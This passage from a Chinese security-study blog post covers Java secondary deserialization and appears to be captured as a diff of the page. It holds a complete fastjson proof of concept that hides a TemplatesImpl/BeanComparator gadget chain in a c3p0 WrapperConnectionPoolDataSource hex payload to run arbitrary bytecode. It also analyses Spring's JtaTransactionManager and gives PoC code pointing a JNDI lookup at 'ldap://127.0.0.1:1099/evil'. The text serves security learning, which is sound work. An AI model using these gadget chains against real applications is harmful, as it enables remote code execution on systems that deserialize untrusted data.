+<h3 id="fastjsonpoc"><a class="markdownIt-Anchor" href="#fastjsonpoc"></a> fastjsonPoc</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.Exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0WrapperPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(org.example.Base.Eval.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(queue);</span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;rand1\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;val\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;rand2\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;userOverridesAsString\&quot;: \&quot;HexAsciiSerializedMap:&quot;</span> + bytesToHexString(bytes, bytes.length) + <span class="string">&quot;;\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//System.out.println(hex);</span></span><br><span class="line">        JSON.parseObject(hex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object object) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bytesToHexString</span><span class="params">(<span class="type">byte</span>[] bArray, <span class="type">int</span> length)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(length);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">sTemp</span> <span class="operator">=</span> Integer.toHexString(<span class="number">255</span> &amp; bArray[i]);</span><br><span class="line">            <span class="keyword">if</span> (sTemp.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(sTemp.toUpperCase());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="rmi二次反序列化例题"><a class="markdownIt-Anchor" href="#rmi二次反序列化例题"></a> RMI二次反序列化例题</h2>
+<h3 id="sictf-cc_deserialize"><a class="markdownIt-Anchor" href="#sictf-cc_deserialize"></a> sictf cc_deserialize</h3>
+<p>看随记</p>
+<h2 id="jtatransactionmanager-spring链二次反序列化分析"><a class="markdownIt-Anchor" href="#jtatransactionmanager-spring链二次反序列化分析"></a> <strong>JtaTransactionManager</strong> Spring链二次反序列化分析</h2>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/F12-blog/p/18117746">Spring反序列化JNDI分析 - F12~ - 博客园</a></p>
+<p>Spring框架的<code>JtaTransactionManager</code>类中重写了<code>readObject</code>方法，这个方法最终会调用到JNDI中的<code>lookup()</code>方法，关键是里面的参数可控，这就导致了攻击者可以利用JNDI注入中的lookup()参数注入，传入恶意URI地址指向攻击者的RMI注册表服务，以使受害者客户端加载绑定在攻击者RMI注册表服务上的恶意类，从而实现远程代码执行。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.transaction<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.transaction-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>漏洞入口在<code>org/springframework/transaction/jta/JtaTransactionManager.java</code>的readObject方法</p>
+<p><img src="../images/2746479-20240406181431300-1798807052.png#height=192&amp;id=rk6c6&amp;originHeight=457&amp;originWidth=1317&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=&amp;width=554.png" alt="img" /></p>
+<p>跟进<code>initUserTransactionAndTransactionManager</code></p>
+<p><img src="../images/2746479-20240406181622349-1704377925.png#height=123&amp;id=n8OmI&amp;originHeight=305&amp;originWidth=1383&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=&amp;width=558.png" alt="img" /></p>
+<p>跟进<code>lookupUserTransaction</code>，这里调用了lookup<br />
+<a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/2746479/202404/2746479-20240406181703994-980459123.png#height=190&amp;id=zGKXw&amp;originHeight=540&amp;originWidth=1588&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=&amp;width=557.7142944335938"><img src="../images/2746479-20240406181703994-980459123.png#height=190&amp;id=zGKXw&amp;originHeight=540&amp;originWidth=1588&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=&amp;width=557.png" alt="img" /></a><br />
+跟进lookup方法<br />
+<a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/2746479/202404/2746479-20240406182152477-27918315.png#height=161&amp;id=hgun3&amp;originHeight=375&amp;originWidth=1298&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=&amp;width=555.7142944335938"><img src="../images/2746479-20240406182152477-27918315.png#height=161&amp;id=hgun3&amp;originHeight=375&amp;originWidth=1298&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=&amp;width=555.png" alt="img" /></a></p>
+<p>继续跟进lookup方法，这里调用的是ctx的lookup方法，ctx是一个Context类型，往后追踪ctx，发现ctx其实是<code>InitialContext</code>类的实例，所以这里我们控制name的值就能直接打JNDI注入了<br />
+<a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/2746479/202404/2746479-20240406182259304-147015649.png#height=194&amp;id=NuUiQ&amp;originHeight=535&amp;originWidth=1533&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=&amp;width=555.7142944335938"><img src="../images/2746479-20240406182259304-147015649.png#height=194&amp;id=NuUiQ&amp;originHeight=535&amp;originWidth=1533&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=&amp;width=555.png" alt="img" /></a></p>
+<p><strong>name就是<code>JtaTransactionManager</code>的属性<code>userTransactionName</code>，我们可以反射修改它的值</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.jta.JtaTransactionManager;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">JtaTransactionManager</span> <span class="variable">jtaTransactionManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JtaTransactionManager</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">userTransactionName</span> <span class="operator">=</span> JtaTransactionManager.class.getDeclaredField(<span class="string">&quot;userTransactionName&quot;</span>);</span><br><span class="line">        userTransactionName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        userTransactionName.set(jtaTransactionManager, <span class="string">&quot;ldap://127.0.0.1:1099/evil&quot;</span>);</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(jtaTransactionManager);</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Java安全学习\\SpringJNDI\\test.bin&quot;</span>));</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        obj.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JAVA%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">JAVA二次反序列化</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">JAVA反序列化</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JAVA%E5%AE%89%E5%85%A8/" rel="tag">JAVA安全</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/175637316152817563731618.jpg" data-sizes="auto" alt="0XGAME2025部分复现" class="lazyload">
+          
+        
+        <a href="/2025/10/31/0XGAME2025%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            0XGAME2025部分复现
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/17373827994914.jpg" data-sizes="auto" alt="LD_PRELOAD劫持" class="lazyload">
+        
+      
+      <a href="/2025/10/27/LD_PRELOAD%E5%8A%AB%E6%8C%81/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          LD_PRELOAD劫持
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#signedobjectgetobject"><span class="toc-number">1.</span> <span class="toc-text"> SignedObject#getObject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#romeobjectbeanhashcode"><span class="toc-number">1.1.</span> <span class="toc-text"> Rome(ObjectBean#hashcode)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#romeequalsbeanequals"><span class="toc-number">1.2.</span> <span class="toc-text"> Rome(EqualsBean#equals)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0cc%E4%BE%9D%E8%B5%96%E7%9A%84cb"><span class="toc-number">1.3.</span> <span class="toc-text"> 无CC依赖的CB</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rmiconnector"><span class="toc-number">2.</span> <span class="toc-text"> RMIConnector</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">2.1.</span> <span class="toc-text"> POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wrapperconnectionpooldatasource"><span class="toc-number">3.</span> <span class="toc-text"> WrapperConnectionPoolDataSource</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cc6poc"><span class="toc-number">3.1.</span> <span class="toc-text"> CC6Poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cbpoc"><span class="toc-number">3.2.</span> <span class="toc-text"> CBPoc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjsonpoc"><span class="toc-number">3.3.</span> <span class="toc-text"> fastjsonPoc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rmi%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BE%8B%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text"> RMI二次反序列化例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sictf-cc_deserialize"><span class="toc-number">4.1.</span> <span class="toc-text"> sictf cc_deserialize</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jtatransactionmanager-spring%E9%93%BE%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text"> JtaTransactionManager Spring链二次反序列化分析</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "JAVA反序列化-二次反序列化",
+          url: "http://example.com/2025/10/29/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
+          excerpt: "",
+          description: "",
+          stripContent: "[TOC] Java二次反序列化漏洞  SignedObject#getObject 看fastjson原生反序列化那章  Rome(ObjectBean#hashcode) 1Hashtable#readObject() -&amp;gt; ObjectBean#hashcode() -&amp;gt; EqualsBean#beanHashCode() -&amp;gt; ToStringBean#toString()-&amp;gt;SignedObject#getObject() 1234567891011121314",
+          date: "Wed Oct 29 2025 10:14:20 GMT+0800",
+          updated: "Wed Jan 21 2026 19:03:55 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
